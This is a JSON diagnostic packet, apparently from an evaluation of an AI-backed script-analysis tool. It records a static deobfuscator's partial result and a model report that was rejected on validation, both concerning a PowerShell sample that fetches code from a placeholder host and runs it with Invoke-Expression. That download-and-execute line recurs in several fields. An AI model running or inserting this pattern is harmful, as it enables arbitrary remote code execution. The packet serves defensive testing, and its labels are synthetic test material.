@@ -1,0 +1,190 @@
+{
+  "packet_version": "semantic-readiness-v1",
+  "id": "11-download-invoke-P2",
+  "stage": "diagnostic_development",
+  "raw_artifact": "artifacts/pre_phase4/diagnostics_v3/results/11-download-invoke-P2.json",
+  "raw_sha256": "f85a809694c8ca9821e9391c7d96306791d2f5fc2c1c73d607f9b1a428b53d9e",
+  "original": "$code = (Invoke-WebRequest -Uri 'https://example.invalid/readiness/7319').Content\nInvoke-Expression $code",
+  "original_sha256": "ed626e24ff7d4ff56de8bba23d95924ddaba9e0d775d355d05706597530bf165",
+  "deterministic_recovery_posthoc_not_sent_to_historical_B": {
+    "schema_version": "deobfuscation-v1",
+    "engine_version": "static-subset-v1",
+    "input_sha256": "ed626e24ff7d4ff56de8bba23d95924ddaba9e0d775d355d05706597530bf165",
+    "source_name": "input",
+    "input_provenance": "original",
+    "status": "partial",
+    "semantic_equivalence": "not_claimed",
+    "limits": {
+      "max_input_bytes": 1048576,
+      "max_artifact_bytes": 262144,
+      "max_total_artifact_bytes": 2097152,
+      "max_transformations": 512,
+      "max_depth": 3,
+      "max_expression_depth": 24,
+      "max_concat_terms": 128,
+      "max_tokens": 50000,
+      "max_work_units": 4000000,
+      "max_unresolved": 128
+    },
+    "layers": [
+      {
+        "layer_id": "L0",
+        "source_name": "input",
+        "provenance": "original",
+        "text": "$code = (Invoke-WebRequest -Uri 'https://example.invalid/readiness/7319').Content\nInvoke-Expression $code",
+        "depth": 0,
+        "parent_transformation_id": null,
+        "root_source": null
+      }
+    ],
+    "transformations": [
+      {
+        "transformation_id": "T0001",
+        "technique": "OT-VARSUB",
+        "source": {
+          "layer_id": "L0",
+          "start": 100,
+          "end": 105,
+          "line": 2,
+          "column": 19,
+          "end_line": 2,
+          "end_column": 24
+        },
+        "root_source": {
+          "layer_id": "L0",
+          "start": 100,
+          "end": 105,
+          "line": 2,
+          "column": 19,
+          "end_line": 2,
+          "end_column": 24
+        },
+        "original_fragment": "$code",
+        "provenance": "deobfuscator_recovered",
+        "recovery_kind": "unresolved",
+        "recovered_text": null,
+        "recovered_bytes_base64": null,
+        "dependencies": [],
+        "status": "failed",
+        "deterministic_verified": false,
+        "warnings": [
+          "No unambiguous prior literal binding in the supported scope."
+        ],
+        "added_operation": null,
+        "output_layer_id": null
+      }
+    ],
+    "unresolved": [
+      {
+        "source": {
+          "layer_id": "L0",
+          "start": 8,
+          "end": 81,
+          "line": 1,
+          "column": 9,
+          "end_line": 1,
+          "end_column": 82
+        },
+        "technique_hint": null,
+        "reason": "Only literal strings and explicitly supported expressions can be recovered.",
+        "transformation_id": null
+      },
+      {
+        "source": {
+          "layer_id": "L0",
+          "start": 0,
+          "end": 81,
+          "line": 1,
+          "column": 1,
+          "end_line": 1,
+          "end_column": 82
+        },
+        "technique_hint": "OT-VARSUB",
+        "reason": "Assignment is not a unique literal binding in the supported linear scope.",
+        "transformation_id": null
+      },
+      {
+        "source": {
+          "layer_id": "L0",
+          "start": 100,
+          "end": 105,
+          "line": 2,
+          "column": 19,
+          "end_line": 2,
+          "end_column": 24
+        },
+        "technique_hint": "OT-VARSUB",
+        "reason": "No unambiguous prior literal binding in the supported scope.",
+        "transformation_id": "T0001"
+      }
+    ],
+    "techniques_detected": [
+      "OT-VARSUB"
+    ],
+    "limits_hit": [],
+    "warnings": [],
+    "work_units": 144,
+    "artifact_bytes": 5
+  },
+  "reference": {
+    "labels": [
+      "B01",
+      "B02"
+    ],
+    "human_approved": false
+  },
+  "reference_basis": "predeclared AI-assisted synthetic development reference, not independent ground truth",
+  "model_parsed_claims": {
+    "behaviors": [],
+    "limitations": [
+      "Static analysis cannot execute the script or determine the content of the remote URL. The operation involves dynamic code execution via Invoke-Expression, which is a high-risk pattern regardless of the specific URL target.",
+      "obfuscation_techniques[]",
+      "prompt_injection\":{\"detected\":false,\"notes\":\"No direct prompt injection detected in the provided snippet. However, the use of Invoke-Expression with remote content could be part of an attack chain if the retrieved code contained malicious payloads designed to bypass static checks or exploit runtime environments.\",\"snippets\":[]},"
+    ],
+    "obfuscation_techniques": [],
+    "prompt_injection": {
+      "detected": false,
+      "notes": "No direct prompt injection detected in the provided snippet.",
+      "snippets": []
+    },
+    "recovered_content": [
+      "$code = (Invoke-WebRequest -Uri 'https://example.invalid/readiness/7319').Content\nInvoke-Expression $code"
+    ],
+    "risk_label": "high_risk",
+    "risk_rationale": "The code attempts to fetch content from a remote URL ('https://example.invalid/readiness/7319') and execute it using Invoke-Expression. This pattern is highly suspicious as it allows arbitrary code execution based on the fetched content, potentially leading to remote code execution (RCE) if the server returns malicious scripts.",
+    "uncertainty": {
+      "level": "high",
+      "notes": "The URL target is unknown and unverified. The content returned by the URL is not visible in this static analysis. The specific behavior of the fetched code cannot be determined without execution.",
+      "uninterpretable_fragments": [
+        "Content of 'https://example.invalid/readiness/7319'"
+      ]
+    }
+  },
+  "predicted_labels": [],
+  "model_recovered_content_status": "unverified_model_claims_never_certified",
+  "objective_literal_checks": [],
+  "current_application_structural_validation": {
+    "applicable": false,
+    "accepted": null
+  },
+  "historical_error": {
+    "code": "invalid_response",
+    "message": "1 validation error for ModelReport\n  Value error, high_risk requires a supported combination, never obfuscation alone [type=value_error, input_value={'behaviors': [], 'limita...alid/readiness/7319'\"]}}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.14/v/value_error"
+  },
+  "historical_truncated": false,
+  "AI_assistance": {
+    "kind": "AI_assisted_diagnostic_observation",
+    "not_human_adjudication": true,
+    "text": "Rechazo: high_risk con behaviors vacío. Omite B01/B02 mientras la explicación reconoce descarga e IEX. Incluye fragmentos de estructura JSON como cadenas en limitations; no son campos adicionales ni una reparación válida del contrato."
+  },
+  "human_adjudication": null,
+  "diagnostic_structural_validation": {
+    "accepted": false,
+    "error": {
+      "code": "invalid_response",
+      "message": "1 validation error for ModelReport\n  Value error, high_risk requires a supported combination, never obfuscation alone [type=value_error, input_value={'behaviors': [], 'limita...alid/readiness/7319'\"]}}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.14/v/value_error"
+    }
+  },
+  "profile": "P2",
+  "request_sha256": "7e9412a2c65811855151e72f6ed0466fa7912f067fbd17200f4c4ba4c2ee380d"
+}
